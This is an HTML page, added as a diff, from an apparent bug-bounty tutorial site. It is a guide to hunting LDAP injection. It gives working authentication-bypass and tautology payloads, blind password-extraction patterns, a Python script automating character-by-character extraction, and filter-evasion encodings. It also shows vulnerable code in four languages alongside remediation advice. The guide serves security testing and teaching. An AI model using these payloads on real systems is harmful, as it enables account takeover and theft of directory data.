@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A practical guide to finding LDAP injection vulnerabilities in login forms, search features, and Active Directory integrations. Covers detection, blind extraction, authentication bypass, and report writing.">
+    <title>LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/ldap-injection-hunting-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/ldap-injection-hunting-guide-2026/">
+    <meta property="og:title" content="LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities">
+    <meta property="og:description" content="A practical guide to finding LDAP injection vulnerabilities in login forms, search features, and Active Directory integrations. Covers detection, blind extraction, authentication bypass, and report writing.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/ldap-injection-hunting-guide-2026/">
+    <meta name="twitter:title" content="LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities">
+    <meta name="twitter:description" content="A practical guide to finding LDAP injection vulnerabilities in login forms, search features, and Active Directory integrations. Covers detection, blind extraction, authentication bypass, and report writing.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities",
+      "description": "A practical guide to finding LDAP injection vulnerabilities in login forms, search features, and Active Directory integrations. Covers detection, blind extraction, authentication bypass, and report writing.",
+      "url": "https://bughuntertools.com/articles/ldap-injection-hunting-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities",
+      "description": "A practical guide to finding LDAP injection vulnerabilities in login forms, search features, and Active Directory integrations. Covers detection, blind extraction, authentication bypass, and report writing.",
+      "author": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Bug Hunter Tools",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://bughuntertools.com/images/logos/altclaw-logo-512.png"
+        }
+      },
+      "datePublished": "2026-04-15",
+      "dateModified": "2026-04-15"
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "What is LDAP injection?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "LDAP injection is a vulnerability where user input is inserted into LDAP queries without proper sanitization, allowing attackers to modify query logic to bypass authentication, extract directory data, or escalate privileges."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Where do LDAP injection vulnerabilities appear?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "LDAP injection commonly appears in login forms using Active Directory or LDAP authentication, user/group search functionality, address book lookups, and any feature that queries an LDAP directory based on user input."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do you detect blind LDAP injection?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Blind LDAP injection is detected through boolean-based techniques (observing different responses for true vs false conditions) and time-based techniques (using computationally expensive filters to cause measurable delays)."
+          }
+        }
+      ]
+    },
+    {
+      "@type": "HowTo",
+      "name": "How to Hunt for LDAP Injection Vulnerabilities",
+      "step": [
+        {"@type": "HowToStep", "name": "Identify LDAP-backed features", "text": "Find login forms, search features, and directory lookups that likely query LDAP."},
+        {"@type": "HowToStep", "name": "Test for injection", "text": "Inject LDAP metacharacters and observe error messages or behavior changes."},
+        {"@type": "HowToStep", "name": "Determine injection context", "text": "Identify whether you are inside a filter, DN, or attribute list."},
+        {"@type": "HowToStep", "name": "Exploit or demonstrate impact", "text": "Extract data, bypass authentication, or escalate privileges."},
+        {"@type": "HowToStep", "name": "Write the report", "text": "Document the vulnerability with reproduction steps and impact assessment."}
+      ]
+    }
+  ]
+}
+</script>
+
+<article>
+<h1>LDAP Injection Hunting Guide: Find and Exploit Directory Service Vulnerabilities</h1>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>LDAP injection targets directory services (Active Directory, OpenLDAP) through unsanitized user input in LDAP queries</li>
+<li>Authentication bypass is the highest-impact outcome — a single injection can grant access to any account</li>
+<li>Blind LDAP injection is common in modern apps where error messages are suppressed — boolean-based extraction still works</li>
+<li>Most LDAP injection occurs in login forms, user search, and group membership lookups</li>
+<li>LDAP wildcards (<code>*</code>) are your first detection signal — if <code>*</code> returns all results, the parameter is injectable</li>
+</ul>
+</div>
+
+<h2>Understanding LDAP Queries</h2>
+
+<p>LDAP (Lightweight Directory Access Protocol) queries use a filter syntax:</p>
+
+<pre><code>(&amp;(uid=USERNAME)(userPassword=PASSWORD))</code></pre>
+
+<p>When <code>USERNAME</code> comes directly from user input without sanitization, you can inject LDAP filter operators to change the query logic.</p>
+
+<h3>LDAP Filter Operators</h3>
+
+<table>
+<thead><tr><th>Operator</th><th>Meaning</th><th>Example</th></tr></thead>
+<tbody>
+<tr><td><code>&amp;</code></td><td>AND</td><td><code>(&amp;(uid=admin)(pass=secret))</code></td></tr>
+<tr><td><code>|</code></td><td>OR</td><td><code>(|(uid=admin)(uid=root))</code></td></tr>
+<tr><td><code>!</code></td><td>NOT</td><td><code>(!(uid=guest))</code></td></tr>
+<tr><td><code>*</code></td><td>Wildcard</td><td><code>(uid=a*)</code></td></tr>
+<tr><td><code>=</code></td><td>Equality</td><td><code>(uid=admin)</code></td></tr>
+<tr><td><code>&gt;=</code></td><td>Greater or equal</td><td><code>(uidNumber&gt;=1000)</code></td></tr>
+<tr><td><code>&lt;=</code></td><td>Less or equal</td><td><code>(uidNumber&lt;=500)</code></td></tr>
+</tbody>
+</table>
+
+<h2>Detection Techniques</h2>
+
+<h3>1. Wildcard Test</h3>
+
+<p>The simplest detection — inject <code>*</code> as the username or search term:</p>
+
+<pre><code>Username: *
+Password: anything</code></pre>
+
+<p>If the application returns results or logs you in as the first user in the directory, the parameter is injectable.</p>
+
+<h3>2. Metacharacter Injection</h3>
+
+<p>Inject LDAP special characters and observe behavior:</p>
+
+<pre><code>)(&amp;
+)(|
+*)((
+\00</code></pre>
+
+<p>Error messages mentioning "LDAP", "filter", "directory", or "search" confirm the backend.</p>
+
+<h3>3. Boolean-Based Detection</h3>
+
+<p>Test true vs false conditions:</p>
+
+<pre><code># True condition — should behave normally
+admin)(|(uid=*
+# False condition — should fail
+admin)(|(uid=doesnotexist123</code></pre>
+
+<p>Different responses confirm injection.</p>
+
+<h3>4. Tautology Injection</h3>
+
+<pre><code>*)(uid=*))(|(uid=*</code></pre>
+
+<p>This creates an always-true filter, similar to SQL injection's <code>' OR 1=1--</code>.</p>
+
+<h2>Authentication Bypass</h2>
+
+<h3>Basic Bypass</h3>
+
+<p>If the login query is:</p>
+<pre><code>(&amp;(uid=INPUT_USER)(userPassword=INPUT_PASS))</code></pre>
+
+<p>Inject as username:</p>
+<pre><code>*)(uid=*))(|(uid=*</code></pre>
+
+<p>This transforms the query into:</p>
+<pre><code>(&amp;(uid=*)(uid=*))(|(uid=*)(userPassword=anything))</code></pre>
+
+<p>The first filter <code>(&amp;(uid=*)(uid=*))</code> is always true — you're authenticated as the first directory entry (usually admin).</p>
+
+<h3>Targeted Account Bypass</h3>
+
+<p>To log in as a specific user without knowing their password:</p>
+
+<pre><code>Username: admin)(&amp;)
+Password: anything</code></pre>
+
+<p>Or:</p>
+<pre><code>Username: admin)(|(password=*
+Password: anything</code></pre>
+
+<h3>Null Password Bypass</h3>
+
+<p>Some LDAP implementations allow null binds:</p>
+
+<pre><code>Username: admin
+Password: (empty)</code></pre>
+
+<p>If the application doesn't check for empty passwords before the LDAP bind, this may succeed.</p>
+
+<h2>Data Extraction</h2>
+
+<h3>Attribute Enumeration</h3>
+
+<p>LDAP entries have attributes (mail, telephoneNumber, description, etc.). Extract them by injecting into search filters:</p>
+
+<pre><code>*)(mail=*</code></pre>
+
+<p>If the application displays search results, you'll see email addresses for all users.</p>
+
+<h3>Blind Data Extraction</h3>
+
+<p>When the application only returns true/false (e.g., "user found" vs "user not found"), extract data character by character:</p>
+
+<pre><code># Does admin's password start with 'a'?
+admin)(userPassword=a*
+
+# Does admin's password start with 'ab'?
+admin)(userPassword=ab*
+
+# Continue until the full value is extracted</code></pre>
+
+<h3>Extracting User Lists</h3>
+
+<pre><code># All users whose uid starts with 'a'
+a*
+
+# All users in a specific group
+*)(memberOf=cn=admins,ou=groups,dc=company,dc=com</code></pre>
+
+<h2>Blind LDAP Injection</h2>
+
+<h3>Boolean-Based</h3>
+
+<p>Observe response differences between true and false conditions:</p>
+
+<pre><code># True — user exists
+admin)(uid=admin
+# False — user doesn't exist
+admin)(uid=nonexistent12345</code></pre>
+
+<p>Use this to enumerate:</p>
+<ul>
+<li>Usernames: <code>*)(uid=a*</code> → <code>*)(uid=ab*</code> → ...</li>
+<li>Group memberships: <code>*)(memberOf=cn=X*</code></li>
+<li>Email addresses: <code>*)(mail=a*</code></li>
+<li>Any LDAP attribute</li>
+</ul>
+
+<h3>Automating Blind Extraction</h3>
+
+<pre><code>import requests
+import string
+
+url = "https://target.example.com/search"
+charset = string.ascii_lowercase + string.digits
+extracted = ""
+
+while True:
+    found = False
+    for c in charset:
+        payload = f"*)(uid={extracted}{c}*"
+        r = requests.post(url, data={"username": payload})
+        if "User found" in r.text:
+            extracted += c
+            found = True
+            print(f"Found so far: {extracted}")
+            break
+    if not found:
+        break
+
+print(f"Extracted value: {extracted}")</code></pre>
+
+<h2>LDAP Injection in Different Contexts</h2>
+
+<h3>Search Filter Injection</h3>
+
+<p>Most common. The application builds a filter like:</p>
+<pre><code>(cn=USER_INPUT)</code></pre>
+
+<p>Inject: <code>*)(objectClass=*</code> to dump all objects.</p>
+
+<h3>DN (Distinguished Name) Injection</h3>
+
+<p>Less common but high impact. If user input goes into a DN:</p>
+<pre><code>cn=USER_INPUT,ou=users,dc=company,dc=com</code></pre>
+
+<p>Inject: <code>admin,ou=users,dc=company,dc=com</code> to reference a different entry.</p>
+
+<h3>Attribute Injection</h3>
+
+<p>If the application lets you control which attributes are returned:</p>
+<pre><code>LDAP search returning: uid, INPUT_ATTRIBUTE</code></pre>
+
+<p>Inject: <code>userPassword</code> to include password hashes in the response.</p>
+
+<h2>Common Vulnerable Patterns</h2>
+
+<h3>Java (JNDI)</h3>
+
+<pre><code>// Vulnerable
+String filter = "(&amp;(uid=" + username + ")(userPassword=" + password + "))";
+ctx.search("ou=users,dc=company,dc=com", filter, controls);</code></pre>
+
+<h3>PHP</h3>
+
+<pre><code>// Vulnerable
+$filter = "(&amp;(uid=$username)(userPassword=$password))";
+ldap_search($conn, "ou=users,dc=company,dc=com", $filter);</code></pre>
+
+<h3>Python (python-ldap)</h3>
+
+<pre><code># Vulnerable
+filter_str = f"(&amp;(uid={username})(userPassword={password}))"
+conn.search_s("ou=users,dc=company,dc=com", ldap.SCOPE_SUBTREE, filter_str)</code></pre>
+
+<h3>.NET</h3>
+
+<pre><code>// Vulnerable
+string filter = $"(&amp;(uid={username})(userPassword={password}))";
+searcher.Filter = filter;</code></pre>
+
+<h2>Bypass Techniques</h2>
+
+<h3>Unicode/Hex Encoding</h3>
+
+<p>LDAP supports hex-encoded characters:</p>
+<pre><code>\2a = *
+\28 = (
+\29 = )
+\5c = \
+\00 = NULL</code></pre>
+
+<p>If the application filters <code>*</code>, try <code>\2a</code> instead.</p>
+
+<h3>Double Encoding</h3>
+
+<pre><code>%252a → decodes to %2a → decodes to *</code></pre>
+
+<h3>Case Manipulation</h3>
+
+<p>LDAP attribute names are case-insensitive:</p>
+<pre><code>(UID=admin) = (uid=admin) = (Uid=admin)</code></pre>
+
+<h3>Nested Filters</h3>
+
+<pre><code>(|(uid=admin)(uid=admin))</code></pre>
+
+<p>Some WAFs don't parse nested LDAP filters.</p>
+
+<h2>Testing Methodology</h2>
+
+<ol>
+<li><strong>Identify targets</strong>: Login forms, user search, address books, group lookups, password reset (username field), any feature backed by Active Directory or LDAP</li>
+<li><strong>Fingerprint the backend</strong>: Look for error messages mentioning LDAP, Active Directory, or directory services. Check for ports 389/636 in any exposed configuration</li>
+<li><strong>Test wildcards</strong>: Submit <code>*</code> in each input field. If it returns all results or logs you in, it's injectable</li>
+<li><strong>Test metacharacters</strong>: Submit <code>)</code>, <code>)(</code>, <code>*)(</code>, <code>\00</code> and observe errors or behavior changes</li>
+<li><strong>Determine context</strong>: Are you in a search filter, DN, or attribute list?</li>
+<li><strong>Exploit</strong>: Authentication bypass, data extraction, or privilege escalation depending on context</li>
+<li><strong>Blind extraction</strong>: If no direct output, use boolean-based techniques to extract data character by character</li>
+</ol>
+
+<h2>Tools</h2>
+
+<ul>
+<li><strong>Burp Suite</strong>: Intercept and modify LDAP-bound requests. Use Intruder with LDAP payload lists</li>
+<li><strong>ldapsearch</strong>: Command-line LDAP client for testing queries directly: <code>ldapsearch -x -H ldap://target -b "dc=company,dc=com" "(uid=*)"</code></li>
+<li><strong>OWASP ZAP</strong>: Active scanner includes LDAP injection checks</li>
+<li><strong>Custom scripts</strong>: Python with <code>requests</code> for blind extraction automation</li>
+<li><strong>Nuclei</strong>: Has LDAP injection detection templates</li>
+</ul>
+
+<h2>Impact Assessment</h2>
+
+<table>
+<thead><tr><th>Scenario</th><th>Severity</th></tr></thead>
+<tbody>
+<tr><td>Authentication bypass (login as any user)</td><td>Critical</td></tr>
+<tr><td>Admin account takeover via auth bypass</td><td>Critical</td></tr>
+<tr><td>Extraction of password hashes</td><td>High</td></tr>
+<tr><td>User enumeration (usernames, emails)</td><td>Medium</td></tr>
+<tr><td>Group membership disclosure</td><td>Medium</td></tr>
+<tr><td>Directory structure disclosure</td><td>Low-Medium</td></tr>
+</tbody>
+</table>
+
+<h2>Report Writing</h2>
+
+<h3>Title</h3>
+<p>LDAP Injection in [Feature] Allows [Impact]</p>
+
+<h3>Template</h3>
+
+<pre><code>## Summary
+The [login form / user search / address book] at [URL] is vulnerable to LDAP
+injection. User input is inserted directly into an LDAP filter without
+sanitization, allowing an attacker to [bypass authentication / extract
+directory data / enumerate users].
+
+## Steps to Reproduce
+1. Navigate to [URL]
+2. Enter the following in the [username/search] field: [payload]
+3. Submit the form
+4. Observe [authentication success / data returned / error message]
+
+## Impact
+An attacker can [log in as any user including administrators / extract all
+user email addresses and password hashes / enumerate the full directory
+structure]. This affects [N users / the admin account / all directory data].
+
+## Remediation
+- Use parameterized LDAP queries or LDAP-specific escaping functions
+- In Java: use javax.naming.ldap.LdapName for DN construction
+- In PHP: use ldap_escape() (PHP 5.6+)
+- In Python: use ldap.filter.escape_filter_chars()
+- Validate input against an allowlist of expected characters
+- Implement rate limiting on login and search endpoints</code></pre>
+
+<h2>Related Reading</h2>
+
+<ul>
+<li><a href="/articles/sql-injection-hunting-techniques-2026/">Manual SQL Injection Hunting Techniques</a> — another injection class with similar detection methodology</li>
+<li><a href="/articles/authentication-bypass-bug-bounty-guide-2026/">Authentication Bypass Guide</a> — LDAP injection is a common auth bypass vector</li>
+<li><a href="/articles/ssrf-hunting-bug-bounty-guide-2026/">SSRF Hunting Guide</a> — LDAP injection can chain into SSRF via LDAP URLs</li>
+<li><a href="/articles/command-injection-hunting-bug-bounty-guide-2026/">Command Injection Hunting Guide</a> — injection fundamentals apply across vulnerability classes</li>
+<li><a href="/articles/path-traversal-hunting-guide-2026/">Path Traversal Hunting Guide</a> — another file/data access vulnerability class</li>
+<li><a href="/articles/automated-penetration-testing-guide-2026/">Automated Penetration Testing Guide</a> — automated tools that detect LDAP injection</li>
+</ul>
+
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
+          sidebar.appendChild(header);
+
+          var list = document.createElement('ul');
+          list.className = 'toc-sidebar-list';
+
+          entries.forEach(function(e) {
+            var li = document.createElement('li');
+            li.className = 'toc-sidebar-item' + (e.level === 'H3' ? ' toc-sidebar-item--sub' : '');
+            li.setAttribute('data-heading-id', e.id);
+
+            var a = document.createElement('a');
+            a.href = '#' + e.id;
+            a.textContent = e.text.replace(/^[0-9]+\.\s*/, ''); // strip leading "1. "
+            li.appendChild(a);
+            list.appendChild(li);
+          });
+
+          sidebar.appendChild(list);
+
+          // Append sidebar to main (grid places it to the right)
+          if (mainEl) mainEl.appendChild(sidebar);
+
+          // IntersectionObserver — highlight active heading
+          var items = sidebar.querySelectorAll('.toc-sidebar-item[data-heading-id]');
+          var activeId = null;
+
+          var observer = new IntersectionObserver(function(entries) {
+            entries.forEach(function(entry) {
+              if (entry.isIntersecting) {
+                activeId = entry.target.id;
+              }
+            });
+
+            items.forEach(function(item) {
+              item.classList.toggle(
+                'toc-sidebar-item--active',
+                item.getAttribute('data-heading-id') === activeId
+              );
+            });
+          }, {
+            rootMargin: '-20% 0px -75% 0px',
+            threshold: 0
+          });
+
+          entries.forEach(function(e) { observer.observe(e.el); });
+
+          // Smooth scroll for sidebar links
+          sidebar.addEventListener('click', function(e) {
+            var a = e.target.closest('a');
+            if (!a) return;
+            var id = a.getAttribute('href').replace('#', '');
+            var target = document.getElementById(id);
+            if (target) {
+              e.preventDefault();
+              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+              history.replaceState(null, '', '#' + id);
+            }
+          });
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', buildSidebarToC);
+        } else {
+          buildSidebarToC();
+        }
+      })();
+    </script>
+
+    <!-- ME3: Inline ad injection — inserts 2 ads per article (post-intro + mid-article) -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        var pubId  = 'ca-pub-9373816755142401';
+        var slotId = '9879569728';
+        if (!pubId || !slotId) return;
+
+        function createAdUnit(label) {
+          var wrapper = document.createElement('div');
+          wrapper.className = 'ad-container ad-inline';
+          wrapper.setAttribute('data-ad-label', label);
+          wrapper.innerHTML =
+            '<ins class="adsbygoogle"' +
+            ' style="display:block"' +
+            ' data-ad-client="' + pubId + '"' +
+            ' data-ad-slot="' + slotId + '"' +
+            ' data-ad-format="auto"' +
+            ' data-full-width-responsive="true"></ins>';
+          return wrapper;
+        }
+
+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
